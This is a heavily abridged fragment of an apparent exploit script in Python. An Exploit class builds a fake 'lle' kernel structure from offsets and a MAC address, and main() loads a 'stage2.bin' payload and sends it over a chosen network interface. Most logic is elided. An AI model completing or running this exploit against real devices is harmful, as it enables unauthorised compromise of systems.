...
class Exploit():
    ...
    def __init__(self, offs, iface, ipva, pload):
        self.offs = offs
        self.iface = iface
        self.STAGE2 = pload
    ...
    def build_fake_lle(self):
        ...
        fake_lle += p32(0)  # pad
        fake_lle += p64be(self.UINT_MAC)  # ll_addr
...
def main():
    ...
    parser.add_argument('--sta', default='stage2.bin')
    ...
    with open(args.sta, mode='rb') as f:
        payload = f.read()

    exploit = Exploit(offs, args.interface, args.ipv, payload)
    exploit.run()
